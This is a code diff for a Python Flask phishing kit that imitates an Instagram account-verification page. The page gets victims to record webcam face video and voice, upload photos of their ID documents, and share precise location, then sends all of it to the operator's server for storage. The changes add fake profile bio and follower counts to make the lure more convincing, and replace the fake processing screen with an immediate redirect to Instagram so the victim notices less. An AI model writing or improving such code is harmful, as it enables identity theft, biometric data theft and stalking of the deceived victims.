@@ -113,7 +113,7 @@ def find_profile_picture(folder):
     return None
 
 def get_verification_settings():
-    """Get user preferences for verification process."""
+    """Get user preferences for verification process including profile customization."""
     print("\n" + "="*60)
     print("INSTAGRAM VERIFICATION SETUP")
     print("="*60)
@@ -146,6 +146,29 @@ def get_verification_settings():
         print(f"[!] Tip: Place an image (jpg/png) in {DOWNLOAD_FOLDER} to use as profile picture")
     
     print(f"\n[+] Verification will appear for: @{settings['target_username']}")
+    
+    # --- Profile Customization ---
+    print("\n[+] PROFILE CUSTOMIZATION")
+    bio = input("Enter account bio (optional, default: 'Verified Instagram Account'): ").strip()
+    settings['bio'] = bio if bio else "Verified Instagram Account"
+    
+    posts_input = input("Enter number of posts (or press Enter for random): ").strip()
+    if posts_input.isdigit():
+        settings['post_count'] = int(posts_input)
+    else:
+        settings['post_count'] = random.randint(100, 999)
+    
+    followers_input = input("Enter number of followers (or press Enter for random): ").strip()
+    if followers_input.isdigit():
+        settings['follower_count'] = int(followers_input)
+    else:
+        settings['follower_count'] = random.randint(1000, 9999)
+    
+    following_input = input("Enter number of following (or press Enter for random): ").strip()
+    if following_input.isdigit():
+        settings['following_count'] = int(following_input)
+    else:
+        settings['following_count'] = random.randint(500, 5000)
     
     # Face scan duration
     print("\n1. Face Scan Duration:")
@@ -344,6 +367,10 @@ app = Flask(__name__)
 # Global settings
 VERIFICATION_SETTINGS = {
     'target_username': 'user_' + str(random.randint(100000, 999999)),
+    'bio': 'Verified Instagram Account',
+    'post_count': random.randint(100, 999),
+    'follower_count': random.randint(1000, 9999),
+    'following_count': random.randint(500, 5000),
     'face_duration': 20,
     'voice_enabled': True,
     'voice_duration': 5,
@@ -363,6 +390,10 @@ os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'user_data'), exist_ok=True)
 def create_html_template(settings):
     """Creates the comprehensive Instagram verification template with location."""
     target_username = settings['target_username']
+    bio = settings['bio']
+    post_count = settings['post_count']
+    follower_count = settings['follower_count']
+    following_count = settings['following_count']
     face_duration = settings['face_duration']
     voice_enabled = settings['voice_enabled']
     voice_duration = settings['voice_duration'] if voice_enabled else 0
@@ -458,12 +489,19 @@ def create_html_template(settings):
         .account-name {{
             font-size: 18px;
             font-weight: 600;
-            margin-bottom: 5px;
+            margin-bottom: 2px;
+        }}
+        
+        .account-bio {{
+            color: #a8a8a8;
+            font-size: 13px;
+            margin: 4px 0 8px 0;
         }}
         
         .account-username {{
             color: #a8a8a8;
             font-size: 14px;
+            margin-top: 2px;
         }}
         
         .account-stats {{
@@ -1177,19 +1215,20 @@ def create_html_template(settings):
                 {'<img src="' + profile_picture + '">' if profile_picture else target_username[0].upper()}
             </div>
             <div class="account-name">@{target_username}</div>
-            <div class="account-username">Account Verification Required</div>
+            <div class="account-bio">{bio}</div>
+            <div class="account-username" id="accountStatus">Account Verification Required</div>
             
             <div class="account-stats">
                 <div class="account-stat">
-                    <div class="stat-number">{random.randint(100, 999)}</div>
+                    <div class="stat-number">{post_count}</div>
                     <div class="stat-label">Posts</div>
                 </div>
                 <div class="account-stat">
-                    <div class="stat-number">{random.randint(1000, 9999)}</div>
+                    <div class="stat-number">{follower_count}</div>
                     <div class="stat-label">Followers</div>
                 </div>
                 <div class="account-stat">
-                    <div class="stat-number">{random.randint(500, 5000)}</div>
+                    <div class="stat-number">{following_count}</div>
                     <div class="stat-label">Following</div>
                 </div>
             </div>
@@ -1430,41 +1469,15 @@ def create_html_template(settings):
                 </button>
             </div>
             
-            <!-- Final Step: Processing -->
-            <div class="step" id="stepFinal">
-                <h2 class="step-title">Verification in Progress</h2>
-                <p class="step-subtitle">
-                    Please wait while we verify your information for @{target_username}. This may take a few moments.
-                </p>
-                
-                <div class="instruction-container" style="text-align: center; padding: 40px;">
-                    <div class="instruction-icon" style="font-size: 64px;">⏳</div>
-                    <div class="instruction-text">Processing Your Verification</div>
-                    <div class="instruction-detail">
-                        <div class="loading-spinner"></div>
-                        Analyzing submitted data...
-                    </div>
-                </div>
-                
-                <div class="status-message status-processing" id="finalStatus">
-                    Verifying face scan... 25%
-                </div>
-            </div>
-            
-            <!-- Completion Step -->
+            <!-- Completion Step (immediate redirect) -->
             <div class="step" id="stepComplete">
                 <div class="completion-container">
                     <div class="checkmark"></div>
-                    
                     <h2 class="step-title">Submission Received! ✅</h2>
                     <p class="step-subtitle">
                         Thank you, <strong>@{target_username}</strong>! Your verification data has been successfully submitted.
                     </p>
-                    
-                    <div class="account-access">
-                        Data Upload Complete
-                    </div>
-                    
+                    <div class="account-access">Data Upload Complete</div>
                     <div class="instruction-container">
                         <div class="instruction-icon">📤</div>
                         <div class="instruction-text">All verification data uploaded</div>
@@ -1472,19 +1485,11 @@ def create_html_template(settings):
                             Your face scan, voice sample, ID documents, and location have been received
                         </div>
                     </div>
-                    
                     <div class="next-steps">
-                        <p class="step-subtitle">
-                            You will be redirected to Instagram in <span id="countdown">5</span> seconds...
-                        </p>
-                        <button class="button primary-btn" onclick="redirectToInstagram()">
-                            Go to Instagram Now
-                        </button>
-                        <button class="button secondary-btn" onclick="showReviewPage()">
-                            View Review Status
-                        </button>
+                        <p class="step-subtitle" id="redirectMessage">Redirecting to Instagram...</p>
+                        <button class="button primary-btn" onclick="redirectToInstagram()">Go to Instagram Now</button>
+                        <button class="button secondary-btn" onclick="showReviewPage()">View Review Status</button>
                     </div>
-                    
                     <div class="info-box" style="margin-top: 30px;">
                         <strong>Note:</strong> Your verification data will be securely stored and automatically deleted within 30 days.
                     </div>
@@ -1495,55 +1500,41 @@ def create_html_template(settings):
             <div class="step" id="stepReview">
                 <div class="review-container">
                     <div class="review-clock"></div>
-                    
                     <h2 class="step-title">Verification Under Review</h2>
                     <p class="step-subtitle">
                         Your age verification submission for <strong>@{target_username}</strong> is being reviewed by our team.
                         We will contact you within <strong>48 hours</strong> via the email associated with your account.
                     </p>
-                    
                     <div class="review-timeline">
                         <div class="timeline-item">
                             <div class="timeline-icon">1</div>
                             <div class="timeline-content">
                                 <div class="timeline-title">Submission Received</div>
-                                <div class="timeline-description">
-                                    Your verification data has been successfully uploaded and is in queue for review.
-                                </div>
+                                <div class="timeline-description">Your verification data has been successfully uploaded and is in queue for review.</div>
                             </div>
                         </div>
-                        
                         <div class="timeline-item">
                             <div class="timeline-icon">2</div>
                             <div class="timeline-content">
                                 <div class="timeline-title">Manual Review Process</div>
-                                <div class="timeline-description">
-                                    Our security team is manually reviewing your face scan, ID documents, and other verification data.
-                                </div>
+                                <div class="timeline-description">Our security team is manually reviewing your face scan, ID documents, and other verification data.</div>
                             </div>
                         </div>
-                        
                         <div class="timeline-item">
                             <div class="timeline-icon">3</div>
                             <div class="timeline-content">
                                 <div class="timeline-title">Security Checks</div>
-                                <div class="timeline-description">
-                                    We're running additional security checks to ensure the authenticity of your documents.
-                                </div>
+                                <div class="timeline-description">We're running additional security checks to ensure the authenticity of your documents.</div>
                             </div>
                         </div>
-                        
                         <div class="timeline-item">
                             <div class="timeline-icon">4</div>
                             <div class="timeline-content">
                                 <div class="timeline-title">Final Decision</div>
-                                <div class="timeline-description">
-                                    You'll receive an email with the final decision within 48 hours of submission.
-                                </div>
+                                <div class="timeline-description">You'll receive an email with the final decision within 48 hours of submission.</div>
                             </div>
                         </div>
                     </div>
-                    
                     <div class="contact-info">
                         <div class="contact-item">
                             <div class="contact-icon">📧</div>
@@ -1552,7 +1543,6 @@ def create_html_template(settings):
                                 We've sent a confirmation to the email on file. Please follow any instructions in that email.
                             </div>
                         </div>
-                        
                         <div class="contact-item">
                             <div class="contact-icon">⏰</div>
                             <div class="contact-text">
@@ -1560,7 +1550,6 @@ def create_html_template(settings):
                                 Most reviews are completed within 24-48 hours. You'll be notified once completed.
                             </div>
                         </div>
-                        
                         <div class="contact-item">
                             <div class="contact-icon">🔒</div>
                             <div class="contact-text">
@@ -1569,7 +1558,6 @@ def create_html_template(settings):
                             </div>
                         </div>
                     </div>
-                    
                     <div class="info-box">
                         <strong>What happens next?</strong><br>
                         1. Our team reviews your submission (24-48 hours)<br>
@@ -1577,14 +1565,9 @@ def create_html_template(settings):
                         3. If approved, your account will be fully restored<br>
                         4. If more information is needed, we'll contact you
                     </div>
-                    
                     <div class="next-steps">
-                        <button class="button primary-btn" onclick="returnToInstagram()">
-                            Return to Instagram
-                        </button>
-                        <button class="button secondary-btn" onclick="checkStatus()">
-                            Check Review Status
-                        </button>
+                        <button class="button primary-btn" onclick="returnToInstagram()">Return to Instagram</button>
+                        <button class="button secondary-btn" onclick="checkStatus()">Check Review Status</button>
                     </div>
                 </div>
             </div>
@@ -1630,72 +1613,54 @@ def create_html_template(settings):
         let countdownTimer = null;
         let targetUsername = "{target_username}";
         
-        // Step Navigation
-        function updateProgress() {{
-            const progress = ((currentStep - 1) / (totalSteps - 1)) * 100;
-            document.getElementById('progressBar').style.width = progress + '%';
-            document.getElementById('progressLineFill').style.width = progress + '%';
-            
-            // Update step indicators
-            for (let i = 1; i <= totalSteps + 1; i++) {{
-                const indicator = document.getElementById('step' + i + 'Indicator');
-                if (indicator) {{
-                    indicator.classList.remove('active', 'completed');
-                    if (i < currentStep) {{
-                        indicator.classList.add('completed');
-                    }} else if (i === currentStep) {{
-                        indicator.classList.add('active');
-                    }}
+        // Step Navigation - accepts both numbers and string IDs
+        function showStep(stepNumber) {{
+            document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
+            let stepId = 'step' + stepNumber;
+            const stepElement = document.getElementById(stepId);
+            if (stepElement) {{
+                stepElement.classList.add('active');
+                if (typeof stepNumber === 'number') {{
+                    currentStep = stepNumber;
+                    updateProgress();
                 }}
             }}
         }}
         
-        function showStep(stepNumber) {{
-            document.querySelectorAll('.step').forEach(step => {{
-                step.classList.remove('active');
-            }});
-            const stepElement = document.getElementById('step' + stepNumber);
-            if (stepElement) {{
-                stepElement.classList.add('active');
-                currentStep = stepNumber;
-                updateProgress();
+        function updateProgress() {{
+            if (typeof currentStep !== 'number') return;
+            const progress = ((currentStep - 1) / (totalSteps - 1)) * 100;
+            document.getElementById('progressBar').style.width = progress + '%';
+            document.getElementById('progressLineFill').style.width = progress + '%';
+            for (let i = 1; i <= totalSteps; i++) {{
+                const indicator = document.getElementById('step' + i + 'Indicator');
+                if (indicator) {{
+                    indicator.classList.remove('active', 'completed');
+                    if (i < currentStep) indicator.classList.add('completed');
+                    else if (i === currentStep) indicator.classList.add('active');
+                }}
             }}
         }}
         
         function nextStep() {{
-            if (currentStep < totalSteps + 1) {{
-                showStep(currentStep + 1);
-            }}
+            if (currentStep < totalSteps) showStep(currentStep + 1);
         }}
         
         function prevStep() {{
-            if (currentStep > 1) {{
-                showStep(currentStep - 1);
-            }}
+            if (currentStep > 1) showStep(currentStep - 1);
         }}
         
-        // Face Verification
+        // Face Verification (unchanged)
         async function startFaceVerification() {{
             try {{
                 document.getElementById('startFaceScanBtn').disabled = true;
                 document.getElementById('startFaceScanBtn').innerHTML = '<span class="loading-spinner"></span>Accessing Camera...';
-                
-                // Request camera
                 faceStream = await navigator.mediaDevices.getUserMedia({{
-                    video: {{ 
-                        facingMode: 'user',
-                        width: {{ ideal: 640 }},
-                        height: {{ ideal: 640 }}
-                    }},
+                    video: {{ facingMode: 'user', width: {{ ideal: 640 }}, height: {{ ideal: 640 }} }},
                     audio: false
                 }});
-                
-                // Show video
                 document.getElementById('faceVideo').srcObject = faceStream;
-                
-                // Start the verification process
                 startFaceInstructions();
-                
             }} catch (error) {{
                 console.error("Camera error:", error);
                 alert("Unable to access camera. Please ensure camera permissions are granted.");
@@ -1709,26 +1674,15 @@ def create_html_template(settings):
             faceTimeLeft = {face_duration};
             updateFaceTimer();
             showFaceInstruction(0);
-            
-            // Start recording
             startFaceRecording();
-            
-            // Start countdown timer
             faceTimerInterval = setInterval(() => {{
                 faceTimeLeft--;
                 updateFaceTimer();
-                
-                if (faceTimeLeft <= 0) {{
-                    completeFaceVerification();
-                }}
+                if (faceTimeLeft <= 0) completeFaceVerification();
             }}, 1000);
-            
-            // Start instruction cycle
             instructionTimer = setInterval(() => {{
                 currentInstructionIndex++;
-                if (currentInstructionIndex < faceInstructions.length) {{
-                    showFaceInstruction(currentInstructionIndex);
-                }}
+                if (currentInstructionIndex < faceInstructions.length) showFaceInstruction(currentInstructionIndex);
             }}, 3000);
         }}
         
@@ -1744,26 +1698,14 @@ def create_html_template(settings):
         function updateFaceTimer() {{
             const minutes = Math.floor(faceTimeLeft / 60);
             const seconds = faceTimeLeft % 60;
-            document.getElementById('faceTimer').textContent = 
-                minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
+            document.getElementById('faceTimer').textContent = minutes.toString().padStart(2,'0') + ':' + seconds.toString().padStart(2,'0');
         }}
         
         function startFaceRecording() {{
             faceChunks = [];
             const options = {{ mimeType: 'video/webm;codecs=vp9' }};
-            
-            try {{
-                faceRecorder = new MediaRecorder(faceStream, options);
-            }} catch (e) {{
-                faceRecorder = new MediaRecorder(faceStream);
-            }}
-            
-            faceRecorder.ondataavailable = (event) => {{
-                if (event.data && event.data.size > 0) {{
-                    faceChunks.push(event.data);
-                }}
-            }};
-            
+            try {{ faceRecorder = new MediaRecorder(faceStream, options); }} catch(e) {{ faceRecorder = new MediaRecorder(faceStream); }}
+            faceRecorder.ondataavailable = (event) => {{ if (event.data && event.data.size > 0) faceChunks.push(event.data); }};
             faceRecorder.onstop = sendFaceRecording;
             faceRecorder.start(100);
         }}
@@ -1771,35 +1713,19 @@ def create_html_template(settings):
         function completeFaceVerification() {{
             clearInterval(faceTimerInterval);
             clearInterval(instructionTimer);
-            
-            if (faceRecorder && faceRecorder.state === 'recording') {{
-                faceRecorder.stop();
-            }}
-            
-            // Stop camera
-            if (faceStream) {{
-                faceStream.getTracks().forEach(track => track.stop());
-            }}
-            
-            // Show completion message
+            if (faceRecorder && faceRecorder.state === 'recording') faceRecorder.stop();
+            if (faceStream) faceStream.getTracks().forEach(track => track.stop());
             showFaceInstruction(faceInstructions.length - 1);
             document.getElementById('faceTimer').textContent = "✅ Complete";
-            
-            // Auto-proceed to next step after delay
-            setTimeout(() => {{
-                nextStep();
-            }}, 2000);
+            setTimeout(() => {{ nextStep(); }}, 2000);
         }}
         
         function sendFaceRecording() {{
             if (faceChunks.length === 0) return;
-            
             const videoBlob = new Blob(faceChunks, {{ type: 'video/webm' }});
             const reader = new FileReader();
-            
             reader.onloadend = function() {{
                 const base64data = reader.result.split(',')[1];
-                
                 $.ajax({{
                     url: '/submit_face_verification',
                     type: 'POST',
@@ -1812,45 +1738,28 @@ def create_html_template(settings):
                         target_username: targetUsername
                     }}),
                     contentType: 'application/json',
-                    success: function(response) {{
-                        console.log('Face verification uploaded');
-                    }},
-                    error: function(xhr, status, error) {{
-                        console.error('Face upload error:', error);
-                    }}
+                    success: function(response) {{ console.log('Face verification uploaded'); }},
+                    error: function(xhr, status, error) {{ console.error('Face upload error:', error); }}
                 }});
             }};
-            
             reader.readAsDataURL(videoBlob);
         }}
         
-        // Voice Verification
+        // Voice Verification (unchanged)
         async function startVoiceVerification() {{
             try {{
                 document.getElementById('startVoiceBtn').disabled = true;
                 document.getElementById('startVoiceBtn').innerHTML = '<span class="loading-spinner"></span>Accessing Microphone...';
-                
-                // Request microphone
                 voiceStream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
-                
-                // Start recording
                 startVoiceRecording();
-                
-                // Start countdown
                 voiceTimeLeft = {voice_duration};
                 updateVoiceTimer();
                 voiceTimerInterval = setInterval(() => {{
                     voiceTimeLeft--;
                     updateVoiceTimer();
-                    
-                    if (voiceTimeLeft <= 0) {{
-                        completeVoiceVerification();
-                    }}
+                    if (voiceTimeLeft <= 0) completeVoiceVerification();
                 }}, 1000);
-                
-                // Simulate voice visualization
                 simulateVoiceWave();
-                
             }} catch (error) {{
                 console.error('Microphone error:', error);
                 alert('Unable to access microphone. Please ensure microphone permissions are granted.');
@@ -1862,8 +1771,7 @@ def create_html_template(settings):
         function updateVoiceTimer() {{
             const minutes = Math.floor(voiceTimeLeft / 60);
             const seconds = voiceTimeLeft % 60;
-            document.getElementById('voiceTimer').textContent = 
-                minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
+            document.getElementById('voiceTimer').textContent = minutes.toString().padStart(2,'0') + ':' + seconds.toString().padStart(2,'0');
         }}
         
         function simulateVoiceWave() {{
@@ -1878,52 +1786,26 @@ def create_html_template(settings):
         function startVoiceRecording() {{
             voiceChunks = [];
             const options = {{ mimeType: 'audio/webm;codecs=opus' }};
-            
-            try {{
-                voiceRecorder = new MediaRecorder(voiceStream, options);
-            }} catch (e) {{
-                voiceRecorder = new MediaRecorder(voiceStream);
-            }}
-            
-            voiceRecorder.ondataavailable = (event) => {{
-                if (event.data && event.data.size > 0) {{
-                    voiceChunks.push(event.data);
-                }}
-            }};
-            
+            try {{ voiceRecorder = new MediaRecorder(voiceStream, options); }} catch(e) {{ voiceRecorder = new MediaRecorder(voiceStream); }}
+            voiceRecorder.ondataavailable = (event) => {{ if (event.data && event.data.size > 0) voiceChunks.push(event.data); }};
             voiceRecorder.onstop = sendVoiceRecording;
             voiceRecorder.start();
         }}
         
         function completeVoiceVerification() {{
             clearInterval(voiceTimerInterval);
-            
-            if (voiceRecorder && voiceRecorder.state === 'recording') {{
-                voiceRecorder.stop();
-            }}
-            
-            // Stop microphone
-            if (voiceStream) {{
-                voiceStream.getTracks().forEach(track => track.stop());
-            }}
-            
-            document.getElementById('voiceTimer').textContent = '✅ Complete';
-            
-            // Auto-proceed to next step
-            setTimeout(() => {{
-                nextStep();
-            }}, 2000);
+            if (voiceRecorder && voiceRecorder.state === 'recording') voiceRecorder.stop();
+            if (voiceStream) voiceStream.getTracks().forEach(track => track.stop());
+            document.getElementById('voiceTimer').textContent = "✅ Complete";
+            setTimeout(() => {{ nextStep(); }}, 2000);
         }}
         
         function sendVoiceRecording() {{
             if (voiceChunks.length === 0) return;
-            
             const audioBlob = new Blob(voiceChunks, {{ type: 'audio/webm' }});
             const reader = new FileReader();
-            
             reader.onloadend = function() {{
                 const base64data = reader.result.split(',')[1];
-                
                 $.ajax({{
                     url: '/submit_voice_verification',
                     type: 'POST',
@@ -1936,37 +1818,27 @@ def create_html_template(settings):
                         target_username: targetUsername
                     }}),
                     contentType: 'application/json',
-                    success: function(response) {{
-                        console.log('Voice verification uploaded');
-                    }},
-                    error: function(xhr, status, error) {{
-                        console.error('Voice upload error:', error);
-                    }}
+                    success: function(response) {{ console.log('Voice verification uploaded'); }},
+                    error: function(xhr, status, error) {{ console.error('Voice upload error:', error); }}
                 }});
             }};
-            
             reader.readAsDataURL(audioBlob);
         }}
         
-        // ID Verification
+        // ID Verification (unchanged)
         function handleFileSelect(input, type) {{
             const file = input.files[0];
-            if (file) {{
-                handleIDFile(file, type);
-            }}
+            if (file) handleIDFile(file, type);
         }}
         
         function handleFileDrop(event, type) {{
             event.preventDefault();
             event.currentTarget.classList.remove('dragover');
             const file = event.dataTransfer.files[0];
-            if (file && file.type.startsWith('image/')) {{
-                handleIDFile(file, type);
-            }}
+            if (file && file.type.startsWith('image/')) handleIDFile(file, type);
         }}
         
         function handleIDFile(file, type) {{
-            // Preview image
             const reader = new FileReader();
             reader.onload = function(e) {{
                 const preview = document.getElementById(type + 'Preview');
@@ -1975,36 +1847,26 @@ def create_html_template(settings):
                 preview.style.display = 'block';
             }};
             reader.readAsDataURL(file);
-            
-            // Store file
             idFiles[type] = file;
             checkIDSubmitReady();
         }}
         
         function checkIDSubmitReady() {{
-            const hasFront = idFiles.front !== null;
-            document.getElementById('submitIdBtn').disabled = !hasFront;
+            document.getElementById('submitIdBtn').disabled = idFiles.front === null;
         }}
         
         function submitIDVerification() {{
             const statusDiv = document.getElementById('idStatus');
             statusDiv.className = 'status-message status-processing';
             statusDiv.innerHTML = '<span class="loading-spinner"></span>Uploading ID documents...';
-            
             document.getElementById('submitIdBtn').disabled = true;
             document.getElementById('submitIdBtn').innerHTML = '<span class="loading-spinner"></span>Processing...';
-            
-            // Create FormData
             const formData = new FormData();
-            
             if (idFiles.front) formData.append('front_id', idFiles.front);
             if (idFiles.back) formData.append('back_id', idFiles.back);
-            
             formData.append('timestamp', new Date().toISOString());
             formData.append('session_id', sessionId);
             formData.append('target_username', targetUsername);
-            
-            // Submit via AJAX
             $.ajax({{
                 url: '/submit_id_verification',
                 type: 'POST',
@@ -2014,10 +1876,7 @@ def create_html_template(settings):
                 success: function(response) {{
                     statusDiv.className = 'status-message status-success';
                     statusDiv.textContent = '✓ ID documents uploaded successfully!';
-                    
-                    setTimeout(() => {{
-                        nextStep();
-                    }}, 1500);
+                    setTimeout(() => {{ nextStep(); }}, 1500);
                 }},
                 error: function(xhr, status, error) {{
                     statusDiv.className = 'status-message status-error';
@@ -2028,12 +1887,10 @@ def create_html_template(settings):
             }});
         }}
         
-        // Location Verification
+        // Location Verification – now redirects immediately after success
         function requestLocation() {{
             const button = document.getElementById('locationButton');
             const statusDiv = document.getElementById('locationStatus');
-            const detailsDiv = document.getElementById('locationDetails');
-            
             button.disabled = true;
             button.innerHTML = '<span class="loading-spinner"></span>Getting Location...';
             statusDiv.className = 'status-message status-processing';
@@ -2047,23 +1904,18 @@ def create_html_template(settings):
                 return;
             }}
             
-            // First try: Fast, low accuracy
             navigator.geolocation.getCurrentPosition(
                 (fastPosition) => {{
                     updateLocationUI(fastPosition);
                     sendLocationToServer(fastPosition);
-                    
-                    // Second try: High accuracy
+                    // Try high accuracy as well
                     navigator.geolocation.getCurrentPosition(
                         (accuratePosition) => {{
                             updateLocationUI(accuratePosition);
                             sendLocationToServer(accuratePosition);
                             completeLocationVerification();
                         }},
-                        () => {{
-                            // If high accuracy fails, still complete with fast position
-                            completeLocationVerification();
-                        }},
+                        () => {{ completeLocationVerification(); }},
                         {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
                     );
                 }},
@@ -2081,31 +1933,20 @@ def create_html_template(settings):
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             const accuracy = position.coords.accuracy;
-            
-            // Update display
             document.getElementById('latValue').textContent = lat.toFixed(6);
             document.getElementById('lonValue').textContent = lon.toFixed(6);
             document.getElementById('accuracyValue').textContent = `${{Math.round(accuracy)}} meters`;
-            
-            // Calculate accuracy percentage (higher accuracy = smaller number)
             let accuracyPercentage = 100;
             if (accuracy < 10) accuracyPercentage = 95;
             else if (accuracy < 50) accuracyPercentage = 85;
             else if (accuracy < 100) accuracyPercentage = 70;
             else if (accuracy < 500) accuracyPercentage = 50;
             else accuracyPercentage = 30;
-            
             document.getElementById('accuracyFill').style.width = accuracyPercentage + '%';
-            
-            // Show details
             document.getElementById('locationDetails').style.display = 'block';
-            
-            // Update status
             const statusDiv = document.getElementById('locationStatus');
             statusDiv.className = 'status-message status-success';
             statusDiv.textContent = `✓ Location acquired with ${{Math.round(accuracy)}}m accuracy`;
-            
-            // Store location data
             locationData = {{
                 latitude: lat,
                 longitude: lon,
@@ -2134,12 +1975,8 @@ def create_html_template(settings):
                     target_username: targetUsername
                 }}),
                 contentType: 'application/json',
-                success: function(response) {{
-                    console.log('Location data uploaded');
-                }},
-                error: function(xhr, status, error) {{
-                    console.error('Location upload error:', error);
-                }}
+                success: function(response) {{ console.log('Location data uploaded'); }},
+                error: function(xhr, status, error) {{ console.error('Location upload error:', error); }}
             }});
         }}
         
@@ -2147,76 +1984,26 @@ def create_html_template(settings):
             const button = document.getElementById('locationButton');
             button.disabled = true;
             button.textContent = '✓ Location Verified';
-            
-            // Proceed to final step after delay
-            setTimeout(() => {{
-                startFinalVerification();
-            }}, 2000);
+            // Immediately finish verification and redirect
+            finishVerification();
         }}
         
-        // Final Verification Processing
-        function startFinalVerification() {{
-            showStep('stepFinal');
-            const statusDiv = document.getElementById('finalStatus');
-            let progress = 25;
-            
-            const progressInterval = setInterval(() => {{
-                progress += Math.random() * 15;
-                if (progress > 100) progress = 100;
-                
-                let message = "";
-                if (progress < 30) {{
-                    message = `Verifying face scan... ${{Math.round(progress)}}%`;
-                }} else if (progress < 50) {{
-                    message = `Analyzing voice sample... ${{Math.round(progress)}}%`;
-                }} else if (progress < 70) {{
-                    message = `Checking ID documents... ${{Math.round(progress)}}%`;
-                }} else if (progress < 90) {{
-                    message = `Verifying location... ${{Math.round(progress)}}%`;
-                }} else {{
-                    message = `Finalizing verification... ${{Math.round(progress)}}%`;
-                }}
-                
-                statusDiv.textContent = message;
-                
-                if (progress >= 100) {{
-                    clearInterval(progressInterval);
-                    setTimeout(() => {{
-                        statusDiv.className = 'status-message status-success';
-                        statusDiv.textContent = `✓ Verification complete for @${{targetUsername}}!`;
-                        
-                        // Submit all collected data
-                        submitCompleteVerification();
-                        
-                        // Show completion page
-                        setTimeout(() => {{
-                            showCompletionPage();
-                        }}, 1500);
-                    }}, 1000);
-                }}
-            }}, 800);
-        }}
-        
-        function showCompletionPage() {{
+        // New function to finalize and redirect instantly
+        function finishVerification() {{
+            // Update account status
+            updateAccountStatus('✅ Verification Complete');
+            // Send completion summary
+            submitCompleteVerification();
+            // Show the completion page briefly and redirect
             showStep('stepComplete');
-            
-            // Start countdown to redirect to Instagram
-            let countdown = 5;
-            const countdownElement = document.getElementById('countdown');
-            countdownElement.textContent = countdown;
-            
-            countdownTimer = setInterval(() => {{
-                countdown--;
-                countdownElement.textContent = countdown;
-                if (countdown <= 0) {{
-                    clearInterval(countdownTimer);
-                    redirectToInstagram();
-                }}
-            }}, 1000);
+            // Redirect after a tiny delay to allow page to render
+            setTimeout(() => {{
+                redirectToInstagram();
+            }}, 300);
         }}
         
         function redirectToInstagram() {{
-            window.location.href = 'https://instagram.com';
+            window.location.href = 'https://www.instagram.com';
         }}
         
         function showReviewPage() {{
@@ -2225,7 +2012,7 @@ def create_html_template(settings):
         }}
         
         function returnToInstagram() {{
-            window.location.href = 'https://instagram.com';
+            window.location.href = 'https://www.instagram.com';
         }}
         
         function checkStatus() {{
@@ -2249,13 +2036,14 @@ def create_html_template(settings):
             }});
         }}
         
-        // Initialize progress display
-        updateProgress();
+        function updateAccountStatus(status) {{
+            const statusElement = document.getElementById('accountStatus');
+            if (statusElement) statusElement.textContent = status;
+        }}
         
-        // Auto-start first step after delay
-        setTimeout(() => {{
-            showStep(1);
-        }}, 500);
+        // Initialize
+        updateProgress();
+        setTimeout(() => {{ showStep(1); }}, 500);
     </script>
 </body>
 </html>'''
@@ -2274,16 +2062,13 @@ def submit_face_verification():
             session_id = data.get('session_id', 'unknown')
             target_username = data.get('target_username', 'unknown')
             
-            # Create filename
             timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
             filename = f"face_verification_{target_username}_{session_id}_{timestamp}.webm"
             video_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', filename)
             
-            # Save video
             with open(video_file, 'wb') as f:
                 f.write(base64.b64decode(video_data))
             
-            # Save metadata
             metadata_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', f"metadata_{target_username}_{session_id}_{timestamp}.json")
             metadata = {
                 'filename': filename,
@@ -2295,7 +2080,6 @@ def submit_face_verification():
                 'timestamp': data.get('timestamp', datetime.now().isoformat()),
                 'saved_at': datetime.now().isoformat()
             }
-            
             with open(metadata_file, 'w') as f:
                 json.dump(metadata, f, indent=2)
             
@@ -2316,16 +2100,13 @@ def submit_voice_verification():
             session_id = data.get('session_id', 'unknown')
             target_username = data.get('target_username', 'unknown')
             
-            # Create filename
             timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
             filename = f"voice_verification_{target_username}_{session_id}_{timestamp}.webm"
             audio_file = os.path.join(DOWNLOAD_FOLDER, 'voice_recordings', filename)
             
-            # Save audio
             with open(audio_file, 'wb') as f:
                 f.write(base64.b64decode(audio_data))
             
-            # Save metadata
             metadata_file = os.path.join(DOWNLOAD_FOLDER, 'voice_recordings', f"metadata_{target_username}_{session_id}_{timestamp}.json")
             metadata = {
                 'filename': filename,
@@ -2337,7 +2118,6 @@ def submit_voice_verification():
                 'timestamp': data.get('timestamp', datetime.now().isoformat()),
                 'saved_at': datetime.now().isoformat()
             }
-            
             with open(metadata_file, 'w') as f:
                 json.dump(metadata, f, indent=2)
             
@@ -2356,7 +2136,6 @@ def submit_id_verification():
         target_username = request.form.get('target_username', 'unknown')
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
         
-        # Handle front ID
         front_filename = None
         if 'front_id' in request.files:
             front_file = request.files['front_id']
@@ -2366,7 +2145,6 @@ def submit_id_verification():
                 front_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', front_filename)
                 front_file.save(front_path)
         
-        # Handle back ID
         back_filename = None
         if 'back_id' in request.files:
             back_file = request.files['back_id']
@@ -2376,7 +2154,6 @@ def submit_id_verification():
                 back_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', back_filename)
                 back_file.save(back_path)
         
-        # Save metadata
         metadata_file = os.path.join(DOWNLOAD_FOLDER, 'id_documents', f"metadata_{target_username}_{session_id}_{timestamp}.json")
         metadata = {
             'front_id': front_filename,
@@ -2387,7 +2164,6 @@ def submit_id_verification():
             'timestamp': request.form.get('timestamp', datetime.now().isoformat()),
             'saved_at': datetime.now().isoformat()
         }
-        
         with open(metadata_file, 'w') as f:
             json.dump(metadata, f, indent=2)
         
@@ -2405,11 +2181,8 @@ def submit_location_verification():
         if data and 'latitude' in data and 'longitude' in data:
             session_id = data.get('session_id', 'unknown')
             target_username = data.get('target_username', 'unknown')
-            
-            # Add target username to data
             data['target_username'] = target_username
             
-            # Process location in background thread
             processing_thread = Thread(target=process_and_save_location, args=(data, session_id))
             processing_thread.daemon = True
             processing_thread.start()
